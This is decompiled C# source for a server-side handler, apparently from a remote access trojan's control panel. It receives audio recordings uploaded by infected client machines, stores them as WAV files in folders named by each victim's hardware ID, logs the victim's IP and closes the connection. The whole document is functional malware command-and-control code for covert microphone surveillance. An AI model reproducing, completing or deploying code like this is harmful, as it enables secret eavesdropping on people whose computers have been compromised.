using System;
using System.Drawing;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using Server.Connection;
using Server.Forms;
using Server.MessagePack;

namespace Server.Handle_Packet
{
	// Token: 0x02000038 RID: 56
	public class HandleAudio
	{
		// Token: 0x060002C3 RID: 707 RVA: 0x000149DC File Offset: 0x000149DC
		public async void SaveAudio(Clients client, MsgPack unpack_msgpack)
		{
			try
			{
				FormAudio formAudio = (FormAudio)Application.OpenForms["Audio Recorder:" + unpack_msgpack.ForcePathObject("Hwid").GetAsString()];
				if (unpack_msgpack.ForcePathObject("Close").GetAsString() == "true")
				{
					formAudio.btnStartStopRecord.Text = "Start Recording";
					formAudio.btnStartStopRecord.Enabled = true;
					client.Disconnected();
				}
				else
				{
					formAudio.btnStartStopRecord.Text = "Start Recording";
					formAudio.btnStartStopRecord.Enabled = true;
					string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "SaveAudio");
					if (!Directory.Exists(fullPath))
					{
						Directory.CreateDirectory(fullPath);
					}
					await Task.Run(delegate()
					{
						byte[] asBytes = unpack_msgpack.ForcePathObject("WavFile").GetAsBytes();
						File.WriteAllBytes(fullPath + "//" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".wav", asBytes);
					});
					new HandleLogs().Addmsg(string.Concat(new string[]
					{
						"Client ",
						client.Ip,
						" recording success，file located @ ClientsFolder/",
						unpack_msgpack.ForcePathObject("Hwid").AsString,
						"/SaveAudio"
					}), Color.Purple);
					client.Disconnected();
				}
			}
			catch (Exception ex)
			{
				new HandleLogs().Addmsg("Save recorded file fail " + ex.Message, Color.Red);
			}
		}
	}
}
